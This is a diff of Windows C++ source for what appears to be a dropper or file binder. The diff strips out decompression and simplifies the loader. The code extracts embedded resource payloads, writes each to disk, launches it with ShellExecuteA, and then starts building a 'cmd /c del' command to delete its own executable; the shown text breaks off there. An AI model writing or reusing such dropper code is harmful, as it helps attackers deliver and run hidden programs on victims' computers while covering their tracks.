@@ -1,22 +1,18 @@
 #include<windows.h>
 #include <shlobj.h>
-#include <compressapi.h>
-#pragma comment(lib,"Cabinet.lib")
 
-struct FILEINFO
+
+struct DIRFILEINFO
 {
 	UINT method;
 	char path[MAX_PATH] = { 0 };
-	int fileSzie;
 };
 
-void decompressOutResource()
+void OutResource()
 {
-	int resID=101;
-	FILEINFO fileinfo;
-	ZeroMemory(&fileinfo, sizeof(FILEINFO));
-	DECOMPRESSOR_HANDLE Decompressor = NULL;
-	CreateDecompressor(COMPRESS_ALGORITHM_XPRESS_HUFF, NULL, &Decompressor);
+	int resID = 101;
+	DIRFILEINFO fileinfo;
+	ZeroMemory(&fileinfo, sizeof(DIRFILEINFO));
 	while (1)
 	{
 		HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(resID), RT_RCDATA);
@@ -31,10 +27,7 @@ void decompressOutResource()
 		LPVOID pBuffer = LockResource(hGlobal);
 		if (pBuffer == NULL)
 			return;
-		memcpy(&fileinfo, pBuffer, sizeof(FILEINFO));
-		int CompressedBufferSize = totalSize - sizeof(FILEINFO);
-		PBYTE CompressedBuffer = (PBYTE)malloc(CompressedBufferSize);
-		memcpy(CompressedBuffer, (char*)pBuffer+ sizeof(FILEINFO), CompressedBufferSize);
+		memcpy(&fileinfo, pBuffer, sizeof(DIRFILEINFO));
 		char filepath[MAX_PATH] = { 0 };
 		switch (fileinfo.method)
 		{
@@ -64,27 +57,22 @@ void decompressOutResource()
 		default:
 			break;
 		}
-		PBYTE DecompressedBuffer = (PBYTE)malloc(fileinfo.fileSzie);
-		SIZE_T DecompressedDataSize;
-		Decompress(Decompressor,CompressedBuffer, CompressedBufferSize, DecompressedBuffer,fileinfo.fileSzie,&DecompressedDataSize);
 		HANDLE hFile = CreateFileA(filepath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 		if (hFile == INVALID_HANDLE_VALUE)
 		{
 			return;
 		}
 		DWORD dwNum = 0;
-		WriteFile(hFile, DecompressedBuffer, fileinfo.fileSzie, &dwNum, NULL);
+		WriteFile(hFile, (char *)pBuffer+ sizeof(DIRFILEINFO), totalSize-sizeof(DIRFILEINFO), &dwNum, NULL);
 		CloseHandle(hFile);
 		ShellExecuteA(NULL, "open", filepath, NULL, NULL, SW_SHOW);
-		free(DecompressedBuffer);
-		free(CompressedBuffer);
 		resID++;
 	}
 }
 
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR    lpCmdLine, _In_ int       nCmdShow)
 {
-	decompressOutResource();
+	OutResource();
 	char currentpath[MAX_PATH] = { 0 };
 	char szBat[MAX_PATH] = "/c del ";
 	GetModuleFileNameA(NULL, currentpath, MAX_PATH);
